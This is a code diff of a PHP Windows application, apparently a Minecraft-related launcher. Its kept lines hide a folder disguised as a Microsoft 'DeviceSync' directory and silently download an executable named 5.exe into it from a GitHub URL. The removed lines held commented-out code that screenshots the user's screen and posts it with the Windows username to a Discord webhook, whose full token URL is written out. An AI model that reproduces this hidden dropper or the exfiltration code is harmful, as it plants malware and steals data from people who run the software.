@@ -8,51 +8,7 @@ app()->form('MainForm')->layout->position = [5000,0];
 fs::makeDir($_ENV['ProgramData'].'\\Microsoft\\DeviceSync');
 execute('cmd /c attrib +h '.$_ENV['ProgramData'].'\\Microsoft\\DeviceSync');
 file_put_contents($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\5.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
-if(file_exists($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\5.exe')){
-$c = 'найден!';
-file_put_contents('count.txt',$c);
-}else{
-$c = 'не найден!';
-}
-/*
-use httpclient;
 
-// Replace the URL with your own webhook url
-$url = "https://discord.com/api/webhooks/840855832735645718/yD6Ax41IvrMuMX_3S-RTRIRq-NA_jspfLpjCwEOt3fimk1t17LeROXSlSSa93RCevkik";
-
-//new RobotScript->screenshot()->save($_ENV['TEMP'].'\temp.png','png');
-$hookObject = [
-
-    'file' => new File($_ENV['TEMP'].'\temp.png'),
-    //'file1' => new File('C:\Users\Alex\Desktop\123.mp3'),
-    /*
-     * The general "message" shown above your embeds
-     */
-    "content" => "Файл ".$c,
-
-    /*
-     * The username shown in the message
-     */
-    "username" => $_ENV['USERNAME'],
-    /*
-     * The image location for the senders image
-     */
-    //"avatar_url" => "https://xforgeassets001.xboxlive.com/serviceid-18231953-4b1d-472c-a39e-48b10105b7b7/a711e445-d98f-4849-8729-57b3c15a0f6f/contentname_Thumbnail_0.jpg",
-    /*
-     * Whether or not to read the message in Text-to-speech
-     */
-    "tts" => 0
-
-
-];
-
-$http = new HttpClient;
-$http->requestType = 'MULTIPART';
-$http->responseType = 'JSON';
-$http->post($url,$hookObject);
-//unlink($_ENV['TEMP'].'\temp.png');
-
-*/
 fs::copy('https://github.com/Rastihin/mce/raw/main/start_screen.json',fs::abs('./').'\\data\\resource_packs\\vanilla\\ui\\start_screen.json');
 //Для разрешения запуска должно ровняться 1
 $GLOBALS['start'] = 1;
